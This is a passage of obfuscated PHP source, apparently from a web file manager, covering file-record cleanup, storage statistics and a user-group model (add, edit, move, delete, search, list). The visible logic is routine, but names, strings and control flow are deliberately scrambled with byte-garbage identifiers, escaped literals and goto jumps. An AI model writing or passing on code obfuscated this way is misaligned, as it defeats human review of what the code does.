clearEmpty($aŸõõš‘• = 0) { goto EÊ‚ğƒŠ™¡; EÊ‚ğƒŠ™¡: $E‘ÊÏº‹ =& $_SERVER[¶ªÕß‚ØÁŸ]; $Bœ‡êÓÍ†½ = time() - 3600 * 24 * $aŸõõš‘•; $C²Ó™èœÂ = $E‘ÊÏº‹[2166] . $Bœ‡êÓÍ†½; goto A¨–Ûƒ«‹Ë; dñ´©§˜¬: foreach ($E™Ôö¿„× as $eù¢Í½«È) { $aÓÍ¡’öÉæ->update(1); $this->resetFile($eù¢Í½«È); } $aÓÍ¡’öÉæ->end(); goto cÁ¦‰áÍ’; A¨–Ûƒ«‹Ë: $E™Ôö¿„× = $this->where($C²Ó™èœÂ)->select(); if (!$E™Ôö¿„×) { return; } $aÓÍ¡’öÉæ = new Task($E‘ÊÏº‹[2167], $E‘ÊÏº‹[33], count($E™Ôö¿„×)); goto dñ´©§˜¬; cÁ¦‰áÍ’: } private function resetFile($eï¾¥¦¤Ê) { goto d“»¢Ìô¶; d“»¢Ìô¶: $a±“¯ó¨²Û =& $_SERVER[¶ªÕß‚ØÁŸ]; $D³¸¸¶¹—ê = array($a±“¯ó¨²Û[428] => $eï¾¥¦¤Ê[$a±“¯ó¨²Û[427]]); $C˜šâ°‰òÄ = Model($a±“¯ó¨²Û[1121])->where($D³¸¸¶¹—ê)->count(); goto eæƒ‚‘´ìÚ; eæƒ‚‘´ìÚ: $DÂó®¼õğ« = Model($a±“¯ó¨²Û[2168])->where($D³¸¸¶¹—ê)->count(); $fÕÌÖË¡ = intval($C˜šâ°‰òÄ) + intval($DÂó®¼õğ«); if ($fÕÌÖË¡ == 0) { IO::remove($eï¾¥¦¤Ê[$a±“¯ó¨²Û[85]]); $this->where($D³¸¸¶¹—ê)->delete(); $this->metaSet($eï¾¥¦¤Ê[$a±“¯ó¨²Û[427]], null, null); return; } goto C¬ÇˆßµÑÍ; C¬ÇˆßµÑÍ: if ($eï¾¥¦¤Ê[$a±“¯ó¨²Û[2164]] != $fÕÌÖË¡) { $this->where($D³¸¸¶¹—ê)->save(array($a±“¯ó¨²Û[2161] => $fÕÌÖË¡)); } goto fÁåšÆ£Ä„; fÁåšÆ£Ä„: } public function storageInfo($e¥õÃ¢æç = false) { goto f»ó¾–‹õ; f»ó¾–‹õ: $cñÒ¡’İù¦ =& $_SERVER[¶ªÕß‚ØÁŸ]; $F×ˆÍç¯Ñò = $this->count() + 0.0; $F‹ÆŒãƒ¥Î = 0; goto f“·÷İÉ§Î; f“·÷İÉ§Î: $aĞÂ¿Ñ‚‰ù = 1; $f‡­—ˆçôÑ = 0; $c–—‹” = 5000; goto d•¸Ñ·Âñ; d•¸Ñ·Âñ: for ($Eô¼èŸëïï = 0; $Eô¼èŸëïï < $F×ˆÍç¯Ñò; $Eô¼èŸëïï = $Eô¼èŸëïï + $c–—‹”) { $D½·Şã’ÜÃ = $this->limit($Eô¼èŸëïï, $Eô¼èŸëïï + $c–—‹”)->select(); foreach ($D½·Şã’ÜÃ as $c‹ßï›®³¯) { $aĞÂ¿Ñ‚‰ù += $c‹ßï›®³¯[$cñÒ¡’İù¦[87]] * $c‹ßï›®³¯[$cñÒ¡’İù¦[2164]]; $F‹ÆŒãƒ¥Î += $c‹ßï›®³¯[$cñÒ¡’İù¦[87]] * ($c‹ßï›®³¯[$cñÒ¡’İù¦[2164]] - 1); $f‡­—ˆçôÑ += $c‹ßï›®³¯[$cñÒ¡’İù¦[2164]]; } } $Dôßƒ¬¶í  = array($cñÒ¡’İù¦[2169] => $aĞÂ¿Ñ‚‰ù, $cñÒ¡’İù¦[2170] => $F‹ÆŒãƒ¥Î, $cñÒ¡’İù¦[2171] => $F‹ÆŒãƒ¥Î / $aĞÂ¿Ñ‚‰ù, $cñÒ¡’İù¦[91] => $F×ˆÍç¯Ñò, $cñÒ¡’İù¦[2172] => $f‡­—ˆçôÑ); return $Dôßƒ¬¶í ; goto DÌ‰ìæ¬¡; DÌ‰ìæ¬¡: } } class GroupModel extends ModelBase { protected $tableName = "\147\162\x6f\165\160"; protected $tableMeta = array("\164\141\x62\154\145\116\x61\155\145" => "\x67\x72\157\165\x70\x5f\155\145\x74\141", "\155\145\164\141\x46\151\145\x6c\144" => "\147\x72\157\165\160\111\104"); protected function cacheFunctionAlias($eéæÍÉ ¾) { $BÀòòáğ =& $_SERVER[¶ªÕß‚ØÁŸ]; return array($BÀòòáğ[2173] => array($eéæÍÉ ¾[0], $BÀòòáğ[2174]), $BÀòòáğ[2175] => array($eéæÍÉ ¾[0], $BÀòòáğ[2174])); } protected function getInfo($F›Ú«ÕçÈß) { $Fºä¼¼õ×é = $this->getInfoSimple($F›Ú«ÕçÈß); if (!$Fºä¼¼õ×é) { return !1; } return $this->_listDataApplyItem($Fºä¼¼õ×é); } protected function getInfoSimple($EÇÑ­˜İµ³, $A«ù¼ëÎØÎ = false) { $AìÄ„á§òî =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($A«ù¼ëÎØÎ) { $E»ÅÃÉ‰£— = array($AìÄ„á§òî[2107] => intval($EÇÑ­˜İµ³)); $EÂ¶ŞêéÒ´ = $this->where($E»ÅÃÉ‰£—)->find(); return is_array($EÂ¶ŞêéÒ´) ? $EÂ¶ŞêéÒ´ : array(); } return $this->cacheFunctionGet($AìÄ„á§òî[2176], $EÇÑ­˜İµ³); } protected function groupAdd($dõì¢©‡áÜ) { goto EáˆÚ¯·Ï; EáˆÚ¯·Ï: $DÈãÍçËÇï =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$dõì¢©‡áÜ[$DÈãÍçËÇï[469]] && isset($dõì¢©‡áÜ[$DÈãÍçËÇï[2107]]) && $dõì¢©‡áÜ[$DÈãÍçËÇï[2107]] == 1) { if ($e÷Æ×Æ½í = $this->getInfoSimple($dõì¢©‡áÜ[$DÈãÍçËÇï[2107]], !0)) { return $dõì¢©‡áÜ[$DÈãÍçËÇï[2107]]; } } else { $e÷Æ×Æ½í = $this->getInfoSimple($dõì¢©‡áÜ[$DÈãÍçËÇï[469]]); if (!$e÷Æ×Æ½í) { return !1; } } $eŒËÉ ô™Ç = $DÈãÍçËÇï[478]; goto e¹Ù¥¤Ùàø; F›—®°³’¨: Model($DÈãÍçËÇï[1121])->groupRootAdd($b¯ïŒñíÄ); return $b¯ïŒñíÄ; goto CÅ–…Œµßˆ; fÚ‹‰ùË¬›: if (!empty($dõì¢©‡áÜ[$DÈãÍçËÇï[2107]])) { $Fä˜²´‹İ[$DÈãÍçËÇï[2107]] = $dõì¢©‡áÜ[$DÈãÍçËÇï[2107]]; } $b¯ïŒñíÄ = $this->add($Fä˜²´‹İ); $this->setNamePinyin($b¯ïŒñíÄ, $Fä˜²´‹İ[$DÈãÍçËÇï[28]]); goto F›—®°³’¨; e¹Ù¥¤Ùàø: if ($e÷Æ×Æ½í[$DÈãÍçËÇï[467]]) { $eŒËÉ ô™Ç = $e÷Æ×Æ½í[$DÈãÍçËÇï[467]] . $e÷Æ×Æ½í[$DÈãÍçËÇï[2107]] . $DÈãÍçËÇï[47]; } $Fä˜²´‹İ = array($DÈãÍçËÇï[394] => $this->groupNameAuto($dõì¢©‡áÜ[$DÈãÍçËÇï[469]], $dõì¢©‡áÜ[$DÈãÍçËÇï[28]]), $DÈãÍçËÇï[376] => $dõì¢©‡áÜ[$DÈãÍçËÇï[469]], $DÈãÍçËÇï[533] => $eŒËÉ ô™Ç, $DÈãÍçËÇï[2177] => $dõì¢©‡áÜ[$DÈãÍçËÇï[2091]], $DÈãÍçËÇï[2178] => 0, $DÈãÍçËÇï[2111] => 0); if (isset($dõì¢©‡áÜ[$DÈãÍçËÇï[2128]])) { $Fä˜²´‹İ[$DÈãÍçËÇï[2128]] = $dõì¢©‡áÜ[$DÈãÍçËÇï[2128]]; } else { $b¼±âšÊ¿ã = $this->max($DÈãÍçËÇï[2128]); if (!$b¼±âšÊ¿ã) { $b¼±âšÊ¿ã = 0; } $Fä˜²´‹İ[$DÈãÍçËÇï[2128]] = $b¼±âšÊ¿ã + 1; } goto fÚ‹‰ùË¬›; CÅ–…Œµßˆ: } protected function groupEdit($Dö‹ã…² , $A—ÓÏ„ñ) { $fâˆÜÅ†›‡ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!empty($A—ÓÏ„ñ[$fâˆÜÅ†›‡[469]])) { $fšš‹…¬ŠÖ = $this->getInfoSimple($Dö‹ã…² ); $DÇ‚Ò´ˆæÍ = $this->getInfoSimple($A—ÓÏ„ñ[$fâˆÜÅ†›‡[469]]); if (!$fšš‹…¬ŠÖ || !$DÇ‚Ò´ˆæÍ) { return !1; } if ($fšš‹…¬ŠÖ[$fâˆÜÅ†›‡[2107]] == $DÇ‚Ò´ˆæÍ[$fâˆÜÅ†›‡[2107]]) { return !1; } if ($A—ÓÏ„ñ[$fâˆÜÅ†›‡[469]] != $fšš‹…¬ŠÖ[$fâˆÜÅ†›‡[469]]) { if ($DÇ‚Ò´ˆæÍ[$fâˆÜÅ†›‡[467]] !== $fšš‹…¬ŠÖ[$fâˆÜÅ†›‡[467]] && strpos($DÇ‚Ò´ˆæÍ[$fâˆÜÅ†›‡[467]], $fšš‹…¬ŠÖ[$fâˆÜÅ†›‡[467]] . $fšš‹…¬ŠÖ[$fâˆÜÅ†›‡[2107]] . $fâˆÜÅ†›‡[47]) === 0) { return !1; } $A—ÓÏ„ñ[$fâˆÜÅ†›‡[533]] = $DÇ‚Ò´ˆæÍ[$fâˆÜÅ†›‡[467]] . $A—ÓÏ„ñ[$fâˆÜÅ†›‡[469]] . $fâˆÜÅ†›‡[47]; $this->_changeChildLevel($fšš‹…¬ŠÖ, $DÇ‚Ò´ˆæÍ); } } if (isset($A—ÓÏ„ñ[$fâˆÜÅ†›‡[28]])) { $this->setNamePinyin($Dö‹ã…² , $A—ÓÏ„ñ[$fâˆÜÅ†›‡[28]]); } return $this->where(array($fâˆÜÅ†›‡[2179] => $Dö‹ã…² ))->save($A—ÓÏ„ñ); } private function _changeChildLevel($A•áŠ¼Ÿ‹è, $añ†ã¶‹×”, $FÎ£‰óğù = false) { goto b”æ«‚‰Å; B‘áÙ†óÛæ: $this->where($eëêÙ×ÂÏÀ)->data($EçïÈ‡Á»…)->save(); goto d•’›­“·; C­™œ†‰Ìó: if ($FÎ£‰óğù) { $BÏÑÛ÷ïÌ· = $añ†ã¶‹×”[$DÌÀÃøàë[467]] . $añ†ã¶‹×”[$DÌÀÃøàë[2107]] . $DÌÀÃøàë[47]; } $eëêÙ×ÂÏÀ = array($DÌÀÃøàë[533] => array($DÌÀÃøàë[491], $A•áŠ¼Ÿ‹è[$DÌÀÃøàë[467]] . $A•áŠ¼Ÿ‹è[$DÌÀÃøàë[2107]] . $DÌÀÃøàë[492])); $EçïÈ‡Á»… = array($DÌÀÃøàë[533] => array($DÌÀÃøàë[542], "\x72\x65\x70\x6c\x61\143\x65\50\x70\x61\x72\145\x6e\x74\114\145\166\145\x6c\x2c\x27{$AÇÁì‚·»ä}\47\x2c\47{$BÏÑÛ÷ïÌ·}\47\x29")); goto B‘áÙ†óÛæ; b”æ«‚‰Å: $DÌÀÃøàë =& $_SERVER[¶ªÕß‚ØÁŸ]; $AÇÁì‚·»ä = $A•áŠ¼Ÿ‹è[$DÌÀÃøàë[467]] . $A•áŠ¼Ÿ‹è[$DÌÀÃøàë[2107]] . $DÌÀÃøàë[47]; $BÏÑÛ÷ïÌ· = $añ†ã¶‹×”[$DÌÀÃøàë[467]] . $añ†ã¶‹×”[$DÌÀÃøàë[2107]] . $DÌÀÃøàë[47] . $A•áŠ¼Ÿ‹è[$DÌÀÃøàë[2107]] . $DÌÀÃøàë[47]; goto C­™œ†‰Ìó; d•’›­“·: } public function setNamePinyin($eà§‰ø‚ª, $b¼–˜œ±–… = false) { $CôÀÁ¤ò =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$b¼–˜œ±–…) { $bË³áòñÖñ = $this->getInfoSimple($eà§‰ø‚ª); $b¼–˜œ±–… = $bË³áòñÖñ[$CôÀÁ¤ò[28]]; } if (!Input::check($b¼–˜œ±–…, $CôÀÁ¤ò[536])) { $this->metaSet($eà§‰ø‚ª, $CôÀÁ¤ò[424], null); $this->metaSet($eà§‰ø‚ª, $CôÀÁ¤ò[423], null); return; } $eãØéğˆô = array($CôÀÁ¤ò[424] => str_replace($CôÀÁ¤ò[50], $CôÀÁ¤ò[33], Pinyin::encode($b¼–˜œ±–…)), $CôÀÁ¤ò[423] => Pinyin::encode($b¼–˜œ±–…, $CôÀÁ¤ò[537])); $this->metaSet($eà§‰ø‚ª, $eãØéğˆô); } protected function groupStatus($DÒ‡Š£÷×á, $D×Ü…Âœê°) { goto Bùñİ“Ò¬¯; fö¤±Ø²«ù: if ($D×Ü…Âœê° == $Dê­¶Œï¨[93]) { $D¿‡ëæ¿ò² = $this->parentLevelArray($Bá§Ä«¸ˆ“[$Dê­¶Œï¨[467]]); } else { $C½Şà’‘“´ = array($Dê­¶Œï¨[533] => array($Dê­¶Œï¨[491], $Bá§Ä«¸ˆ“[$Dê­¶Œï¨[467]] . $Bá§Ä«¸ˆ“[$Dê­¶Œï¨[2107]] . $Dê­¶Œï¨[492])); $D¿‡ëæ¿ò² = $this->where($C½Şà’‘“´)->field($Dê­¶Œï¨[2107])->select(); $D¿‡ëæ¿ò² = array_to_keyvalue($D¿‡ëæ¿ò², $Dê­¶Œï¨[33], $Dê­¶Œï¨[2107]); } $D¿‡ëæ¿ò²[] = $Bá§Ä«¸ˆ“[$Dê­¶Œï¨[2107]]; $CŸ°±³ä‰å = array(); goto bÜ§‘·È²; Bùñİ“Ò¬¯: $Dê­¶Œï¨ =& $_SERVER[¶ªÕß‚ØÁŸ]; $Bá§Ä«¸ˆ“ = $this->getInfoSimple($DÒ‡Š£÷×á); if (!$Bá§Ä«¸ˆ“) { return !1; } goto fö¤±Ø²«ù; bÜ§‘·È²: foreach ($D¿‡ëæ¿ò² as $DÒ‡Š£÷×á) { $CŸ°±³ä‰å[] = array($Dê­¶Œï¨[2107] => $DÒ‡Š£÷×á, $Dê­¶Œï¨[99] => $Dê­¶Œï¨[702], $Dê­¶Œï¨[368] => $D×Ü…Âœê°); } return Model($Dê­¶Œï¨[2180])->addAll($CŸ°±³ä‰å, array(), !0); goto bœË†ãÁØà; bœË†ãÁØà: } private function _groupStatusApply($CÃäˆÊ¸Å, $eáÌˆóŠÉÖ) { $Cˆ¤¶»å…‡ =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($eáÌˆóŠÉÖ == $Cˆ¤¶»å…‡[93]) { $bºËä‹ëŠË = $this->parentLevelArray($CÃäˆÊ¸Å[$Cˆ¤¶»å…‡[467]]); } else { $E‹½„§ª = array($Cˆ¤¶»å…‡[533] => array($Cˆ¤¶»å…‡[491], $CÃäˆÊ¸Å[$Cˆ¤¶»å…‡[467]] . $CÃäˆÊ¸Å[$Cˆ¤¶»å…‡[2107]] . $Cˆ¤¶»å…‡[492])); $bºËä‹ëŠË = $this->where($E‹½„§ª)->field($Cˆ¤¶»å…‡[2107])->select(); $bºËä‹ëŠË = array_to_keyvalue($bºËä‹ëŠË, $Cˆ¤¶»å…‡[33], $Cˆ¤¶»å…‡[2107]); } if (empty($bºËä‹ëŠË)) { return; } $b¤²ÉÅİ×ƒ = array(); foreach ($bºËä‹ëŠË as $CîçÆ÷ÜÛ) { $b¤²ÉÅİ×ƒ[] = array($Cˆ¤¶»å…‡[2107] => $CîçÆ÷ÜÛ, $Cˆ¤¶»å…‡[99] => $Cˆ¤¶»å…‡[702], $Cˆ¤¶»å…‡[368] => $eáÌˆóŠÉÖ); } Model($Cˆ¤¶»å…‡[2180])->addAll($b¤²ÉÅİ×ƒ, array(), !0); } protected function groupRemove($F¶Êèî´‚å) { goto bàÃ†¶ø—; bàÃ†¶ø—: $A…Â©ø†¦ =& $_SERVER[¶ªÕß‚ØÁŸ]; $b¬¶ğ†ª‘ = array($A…Â©ø†¦[2107] => $F¶Êèî´‚å); $b°†à¸°Ãè = $this->where($b¬¶ğ†ª‘)->find(); goto dàï­ˆìİ¡; a¤ŞßãÊ÷: $this->where(array($A…Â©ø†¦[469] => $F¶Êèî´‚å))->save(array($A…Â©ø†¦[469] => $b°†à¸°Ãè[$A…Â©ø†¦[469]])); Model($A…Â©ø†¦[2180])->where($b¬¶ğ†ª‘)->delete(); Model($A…Â©ø†¦[2181])->where($b¬¶ğ†ª‘)->delete(); goto F­Šì† å—; dàï­ˆìİ¡: if (!$b°†à¸°Ãè || $b°†à¸°Ãè[$A…Â©ø†¦[469]] == 0) { return !1; } $Bî®±øÀÎ = $this->getInfoSimple($b°†à¸°Ãè[$A…Â©ø†¦[469]]); $this->_changeChildLevel($b°†à¸°Ãè, $Bî®±øÀÎ, !0); goto a¤ŞßãÊ÷; F­Šì† å—: Model($A…Â©ø†¦[766])->groupRootRemove($F¶Êèî´‚å); return $this->where($b¬¶ğ†ª‘)->delete(); goto dŸÖõƒŒ¦; dŸÖõƒŒ¦: } public function listData() { $a½Î‚¿ˆ¡ù = $this->_makeOrder()->selectPage(50); $this->_listDataApply($a½Î‚¿ˆ¡ù[$_SERVER[¶ªÕß‚ØÁŸ][363]]); return $a½Î‚¿ˆ¡ù; } private function _makeOrder($dß‘èïÚÌ = '') { goto CÊ¶Â’¼ë; CÊ¶Â’¼ë: $F¥ù£ˆé =& $_SERVER[¶ªÕß‚ØÁŸ]; $bÙà½Æö‰Æ = array($F¥ù£ˆé[2107], $F¥ù£ˆé[28], $F¥ù£ˆé[2093], $F¥ù£ˆé[197]); $Fª²Ñ›º™ = array($F¥ù£ˆé[410] => $F¥ù£ˆé[411], $F¥ù£ˆé[412] => $F¥ù£ˆé[413]); goto EÓ¥äôéŞ·; EÓ¥äôéŞ·: $B¶À®ˆÓÌ = Input::get($F¥ù£ˆé[415], $F¥ù£ˆé[7], $F¥ù£ˆé[2111], $bÙà½Æö‰Æ); $E°ºÑãÉ± = Input::get($F¥ù£ˆé[416], $F¥ù£ˆé[7], $F¥ù£ˆé[2182], array($F¥ù£ˆé[2182], $F¥ù£ˆé[412])); $E°ºÑãÉ± = $Fª²Ñ›º™[$E°ºÑãÉ±]; goto bˆâˆŠùö†; bˆâˆŠùö†: $dß‘èïÚÌ = $dß‘èïÚÌ . "{$B¶À®ˆÓÌ}\40{$E°ºÑãÉ±}\54\40\147\162\x6f\x75\160\x49\x44\x20\141\163\143"; return $this->order($dß‘èïÚÌ); goto B—êèŠ’õ; B—êèŠ’õ: } public function listChild($CËïÅ¬Î•è) { $e‘Â±÷”ø =& $_SERVER[¶ªÕß‚ØÁŸ]; $EŞŸØ±à = $this->where(array($e‘Â±÷”ø[469] => $CËïÅ¬Î•è))->_makeOrder()->selectPage(200); $this->_listDataApply($EŞŸØ±à[$e‘Â±÷”ø[363]]); return $EŞŸØ±à; } public function listByID($CÜª°ä÷Ü´) { $eÈ·ô =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$CÜª°ä÷Ü´) { return array(); } $fôˆóâ×æ‡ = array($eÈ·ô[2107] => array($eÈ·ô[7], $CÜª°ä÷Ü´)); $CÖ…¶ÍÜ›† = $this->where($fôˆóâ×æ‡)->select(); $this->_listDataApply($CÖ…¶ÍÜ›†); return $CÖ…¶ÍÜ›†; } public function listSearch($C¿‚‹Ç¦ë) { goto B§¼Ö¤å„Å; B§¼Ö¤å„Å: $Aø¦·ò†• =& $_SERVER[¶ªÕß‚ØÁŸ]; $B†Â±ÓåµÔ = $C¿‚‹Ç¦ë[$Aø¦·ò†•[2183]]; $F­ôŸÏòë = isset($C¿‚‹Ç¦ë[$Aø¦·ò†•[2184]]) ? $C¿‚‹Ç¦ë[$Aø¦·ò†•[2184]] : !1; goto Dğ½é¡Õê’; AòöâÎ‘ Ş: $DÌøÑ—ÛĞì = $this->_makeOrder()->where($c‚°Áà¶ƒ)->selectPage(20); $DÌøÑ—ÛĞì = $DÌøÑ—ÛĞì ? $DÌøÑ—ÛĞì : array(); if (!$DÌøÑ—ÛĞì || count($DÌøÑ—ÛĞì[$Aø¦·ò†•[363]]) < 5 && Input::check($B†Â±ÓåµÔ, $Aø¦·ò†•[315])) { $díÌâÄÛ = $this->_searchFromMeta($Aø¦·ò†•[423], $B†Â±ÓåµÔ, 10); $d‹„ë×à®¿ = $this->_searchFromMeta($Aø¦·ò†•[424], $B†Â±ÓåµÔ, 10); $CÚ¤°ÒÂ­Ñ = array_merge($díÌâÄÛ, $d‹„ë×à®¿, $DÌøÑ—ÛĞì[$Aø¦·ò†•[363]]); $DÌøÑ—ÛĞì[$Aø¦·ò†•[363]] = array_unique_by_key($CÚ¤°ÒÂ­Ñ, $Aø¦·ò†•[2107]); $DÌøÑ—ÛĞì[$Aø¦·ò†•[360]][$Aø¦·ò†•[361]] = count($DÌøÑ—ÛĞì[$Aø¦·ò†•[363]]); $DÌøÑ—ÛĞì[$Aø¦·ò†•[360]][$Aø¦·ò†•[362]] = ceil($DÌøÑ—ÛĞì[$Aø¦·ò†•[360]][$Aø¦·ò†•[361]] / $DÌøÑ—ÛĞì[$Aø¦·ò†•[360]][$Aø¦·ò†•[358]]); } goto F†³ëößÆ; Dğ½é¡Õê’: if (!trim($B†Â±ÓåµÔ)) { return !1; } $B†Â±ÓåµÔ = str_replace($Aø¦·ò†•[2185], $Aø¦·ò†•[2186], $B†Â±ÓåµÔ); $c‚°Áà¶ƒ = array($Aø¦·ò†•[2107] => array($Aø¦·ò†•[765], "\x25{$B†Â±ÓåµÔ}\45"), $Aø¦·ò†•[28] => array($Aø¦·ò†•[765], "\45{$B†Â±ÓåµÔ}\45"), $Aø¦·ò†•[920] => $Aø¦·ò†•[2187]); goto AòöâÎ‘ Ş; F†³ëößÆ: $this->_listDataApply($DÌøÑ—ÛĞì[$Aø¦·ò†•[363]]); return $DÌøÑ—ÛĞì; goto dŠòÈ…³„Ñ; dŠòÈ…³„Ñ: } private function _searchFromMeta($a»‡çÒèŞ, $eã·Œ…Õß, $dÓ„ùŸíæ) { goto aˆ‰î‹…±ª; cœ¥µÌ¬¥š: $Fëï†ˆ•øš = $this->where(array($bµë´¸µ•‰[2179] => array($bµë´¸µ•‰[7], $fÓ½Ü¯·)))->select(); if (!$Fëï†ˆ•øš) { return array(); } return $Fëï†ˆ•øš; goto Fš¶”ø‚¹ö; d…äÑËĞ: $fÓ½Ü¯· = Model($bµë´¸µ•‰[2188])->where($cŠ‚Æ½ì)->limit($dÓ„ùŸíæ)->select(); if (!$fÓ½Ü¯·) { return array(); } $fÓ½Ü¯· = array_to_keyvalue($fÓ½Ü¯·, $bµë´¸µ•‰[33], $bµë´¸µ•‰[2107]); goto cœ¥µÌ¬¥š; aˆ‰î‹…±ª: $bµë´¸µ•‰ =& $_SERVER[¶ªÕß‚ØÁŸ]; $eã·Œ…Õß = strtolower($eã·Œ…Õß); $cŠ‚Æ½ì = array($bµë´¸µ•‰[99] => $a»‡çÒèŞ, $bµë´¸µ•‰[368] => array($bµë´¸µ•‰[765], "\x25{$eã·Œ…Õß}\x25")); goto d…äÑËĞ; Fš¶”ø‚¹ö: } protected function _listDataApplyItem($cË×Éõ…øÚ) { $AŞ¸Ô—ïßª = array($cË×Éõ…øÚ); $this->_listDataApply($AŞ¸Ô—ïßª); return $AŞ¸Ô—ïßª[0]; } protected function _listDataApply(&$B¡²É‹¤‚Ğ) { goto E‡çÀ…©´¤; e†À¸—™´Ï: $this->_listAppendParent($B¡²É‹¤‚Ğ); $this->_listAppendSourceRoot($B¡²É‹¤‚Ğ, $DÇŞ’á¥Ó½); goto C¹ÃÈ¥‰öš; E‡çÀ…©´¤: $cŠ¯äƒÍÎ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$B¡²É‹¤‚Ğ) { return; } $DÇŞ’á¥Ó½ = array_to_keyvalue($B¡²É‹¤‚Ğ, $cŠ¯äƒÍÎ[33], $cŠ¯äƒÍÎ[2107]); goto d‡†ƒ¾ğ›»; d‡†ƒ¾ğ›»: $this->_listAppendChildren($B¡²É‹¤‚Ğ); $this->_listAppendChildrenMember($B¡²É‹¤‚Ğ); $this->_listAppendMeta($B¡²É‹¤‚Ğ, $DÇŞ’á¥Ó½); goto e†À¸—™´Ï; C¹ÃÈ¥‰öš: } private function _listAppendChildren(&$EÃ¦ºŞ…Ÿ·) { goto DàÈÛÔ“°—; eÙ“è±É‰: $C§Æ¾ê˜¿ = array_to_keyvalue($C§Æ¾ê˜¿, $f©Š¸ìƒÁ[458]); foreach ($EÃ¦ºŞ…Ÿ· as &$BÓ¹ù´Ó–›) { $BÓ¹ù´Ó–›[$f©Š¸ìƒÁ[2189]] = isset($C§Æ¾ê˜¿[$BÓ¹ù´Ó–›[$f©Š¸ìƒÁ[2107]] . $f©Š¸ìƒÁ[2190]]); } goto cáˆÂì»º; a ¤ÎÉ‰ó¼: $D°®¸ò¶ìô = count($EÃ¦ºŞ…Ÿ·); $Dà—©šÁæ = $this->tablePrefix . $this->tableName; for ($cª¿‹Ş™Ÿ = 0, $A²‹¤÷‹³ = 0; $cª¿‹Ş™Ÿ < $D°®¸ò¶ìô; $cª¿‹Ş™Ÿ++) { $A²‹¤÷‹³++; $C¹¼‚è¦ùÄ = $EÃ¦ºŞ…Ÿ·[$cª¿‹Ş™Ÿ][$f©Š¸ìƒÁ[2107]]; $B÷Á®å¯Û‡ .= "\x53\x45\114\x45\103\x54\x20\x2a\40\106\122\x4f\115\40\x28\123\105\x4c\x45\103\x54\40\x27{$C¹¼‚è¦ùÄ}\x5f\143\150\x69\154\144\x27\x20\x61\x73\x20\150\x61\163\x20\106\x52\117\x4d\x20\140{$Dà—©šÁæ}\140\x20\167\150\145\x72\145\40\x70\141\162\x65\x6e\164\111\104\x3d{$C¹¼‚è¦ùÄ}\x20\154\151\155\151\x74\40\x31\51\40\141\x73\40\164\142\x5f{$C¹¼‚è¦ùÄ}\40\165\x6e\x69\x6f\x6e\40\141\154\154\40"; if (($A²‹¤÷‹³ >= 20 || $cª¿‹Ş™Ÿ == $D°®¸ò¶ìô - 1) && $B÷Á®å¯Û‡) { $B÷Á®å¯Û‡ = substr($B÷Á®å¯Û‡, 0, -strlen($f©Š¸ìƒÁ[457])); $eğ˜“Æ²õ¢ = $this->query($B÷Á®å¯Û‡); $C§Æ¾ê˜¿ = array_merge($C§Æ¾ê˜¿, $eğ˜“Æ²õ¢); $A²‹¤÷‹³ = 0; $B÷Á®å¯Û‡ = $f©Š¸ìƒÁ[33]; } } goto eÙ“è±É‰; DàÈÛÔ“°—: $f©Š¸ìƒÁ =& $_SERVER[¶ªÕß‚ØÁŸ]; $B÷Á®å¯Û‡ = $f©Š¸ìƒÁ[66]; $C§Æ¾ê˜¿ = array(); goto a ¤ÎÉ‰ó¼; cáˆÂì»º: } private function _listAppendChildrenMember(&$D…„ÒÑÀÁŒ) { goto c×ŸºÒÑÇ¬; c×ŸºÒÑÇ¬: $c©Ÿ¢ë‘Ûƒ =& $_SERVER[¶ªÕß‚ØÁŸ]; $F±… ¯¥ = $c©Ÿ¢ë‘Ûƒ[66]; $FÈ‹¥ªÆó  = array(); goto CÏ‹¿™¿¹; B„ÂÜòËùˆ: $FÈ‹¥ªÆó  = array_to_keyvalue($FÈ‹¥ªÆó , $c©Ÿ¢ë‘Ûƒ[458]); foreach ($D…„ÒÑÀÁŒ as &$e¬„‰ßƒñ) { $e¬„‰ßƒñ[$c©Ÿ¢ë‘Ûƒ[2191]] = isset($FÈ‹¥ªÆó [$e¬„‰ßƒñ[$c©Ÿ¢ë‘Ûƒ[2107]] . $c©Ÿ¢ë‘Ûƒ[2190]]); } goto D‡ö¿»Øºò; CÏ‹¿™¿¹: $a‡‚İ¥–šÌ = count($D…„ÒÑÀÁŒ); $eÉ¨Ñ¦×ğ± = $this->tablePrefix . $c©Ÿ¢ë‘Ûƒ[2181]; for ($fù…ÊäÑ† = 0, $B³Ô˜“Ö‘Í = 0; $fù…ÊäÑ† < $a‡‚İ¥–šÌ; $fù…ÊäÑ†++) { $B³Ô˜“Ö‘Í++; $F«ó÷ŠÂ© = $D…„ÒÑÀÁŒ[$fù…ÊäÑ†][$c©Ÿ¢ë‘Ûƒ[2107]]; $F±… ¯¥ .= "\123\x45\x4c\x45\x43\124\x20\x2a\40\x46\x52\x4f\115\x20\50\x53\105\114\x45\x43\124\40\x27{$F«ó÷ŠÂ©}\137\x63\x68\151\154\x64\47\x20\x61\163\40\150\141\x73\x20\x46\x52\117\115\40\x60{$eÉ¨Ñ¦×ğ±}\140\x20\167\x68\145\x72\x65\x20\147\162\157\x75\x70\111\104\x3d{$F«ó÷ŠÂ©}\40\154\x69\155\x69\164\40\61\x29\x20\x61\163\40\x74\142\x5f{$F«ó÷ŠÂ©}\40\165\x6e\151\x6f\156\40\x61\x6c\x6c\x20"; if (($B³Ô˜“Ö‘Í >= 20 || $fù…ÊäÑ† == $a‡‚İ¥–šÌ - 1) && $F±… ¯¥) { $F±… ¯¥ = substr($F±… ¯¥, 0, -strlen($c©Ÿ¢ë‘Ûƒ[457])); $Eöî¬ÖÊèù = $this->query($F±… ¯¥); $FÈ‹¥ªÆó  = array_merge($FÈ‹¥ªÆó , $Eöî¬ÖÊèù); $B³Ô˜“Ö‘Í = 0; $F±… ¯¥ = $c©Ÿ¢ë‘Ûƒ[33]; } } goto B„ÂÜòËùˆ; D‡ö¿»Øºò: } private function _listAppendMeta(&$dª©ÍµòÍô, $bĞÑéìÍ‘š) { $eÈ¨‚Õ² =& $_SERVER[¶ªÕß‚ØÁŸ]; $FõçŠğ•¢ = array($eÈ¨‚Õ²[2107] => array($eÈ¨‚Õ²[7], $bĞÑéìÍ‘š)); $dÎéÉÑÒŠ = 